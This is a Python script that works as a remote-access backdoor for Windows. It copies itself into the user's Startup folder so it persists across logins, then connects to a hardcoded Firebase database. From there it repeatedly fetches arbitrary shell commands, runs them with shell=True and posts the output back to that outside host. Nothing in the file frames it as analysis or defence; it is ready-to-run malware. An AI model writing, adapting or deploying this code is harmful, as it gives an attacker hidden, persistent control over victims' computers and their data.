

import os
import base64
import shutil

# Try to install firebase-admin using pip3
try:
    os.system("pip3 install firebase-admin")
except Exception as e:
    print(f"An error occurred while trying to install firebase-admin with pip3: {e}")

# Try to install firebase-admin using pip
try:
    os.system("pip install firebase-admin")
except Exception as e:
    print(f"An error occurred while trying to install firebase-admin with pip: {e}")

def copy_to_startup(file_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    file_name = os.path.basename(file_path)
    dest_path = os.path.join(startup_folder, file_name)
    shutil.copy2(file_path, dest_path)  # Use shutil.copy2 to copy instead of move
    print(f"Copied {file_path} to {dest_path}")

def copy_to_program(file_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs')
    file_name = os.path.basename(file_path)
    dest_path = os.path.join(startup_folder, file_name)
    shutil.copy2(file_path, dest_path)  # Use shutil.copy2 to copy instead of move
    print(f"Copied {file_path} to {dest_path}")



def get_certificate_path(file_name):
    # Get the APPDATA environment variable
    appdata_path = os.getenv('APPDATA')
    
    if not appdata_path:
        raise EnvironmentError("APPDATA environment variable is not set.")
    
    # Construct the full path to the Startup folder
    startup_folder = os.path.join(appdata_path, r'Microsoft\Windows\Start Menu\Programs')
    
    # Construct the full path to the file
    file_path = os.path.join(startup_folder, file_name)
    
    # Check if the file exists
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"The file {file_path} does not exist.")
    
    return file_path


# Get the path of the current script
script_path = os.path.abspath(__file__)   
copy_to_startup(script_path)
copy_to_program('python.libraries')
copy_to_program('lib.json')

import subprocess
import firebase_admin
from firebase_admin import credentials, db

# Initialize Firebase
file_name = 'lib.json'
cert_path = get_certificate_path(file_name)
cred = credentials.Certificate(cert_path)

firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://chatweb-bf841-default-rtdb.firebaseio.com'
})

# Reference to the 'command' and 'response' nodes
command_ref = db.reference('command')
response_ref = db.reference('response')

# Track the current working directory
current_directory = os.getcwd()

while True:
    try:
        # Retrieve command from Firebase
        command = command_ref.get()
        
        if command:
            try:
                if command.startswith("cd "):
                    # Change directory within the script
                    target_directory = command.split("cd ", 1)[1].strip()
                    os.chdir(target_directory)
                    current_directory = os.getcwd()
                    output = f"Changed directory to {current_directory}"
                else:
                    # Execute the command and get output
                    process = subprocess.Popen(command, shell=True, cwd=current_directory,
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    stdout, stderr = process.communicate()
                    output = stdout + stderr

                # Set output in Firebase
                response_ref.set(output)
            except Exception as e:
                response_ref.set(f"CHYBA: {str(e)}")
            
            # Once the command is executed, delete it from Firebase
            command_ref.delete()
    except Exception as e:
        print(f"An error occurred: {e}")
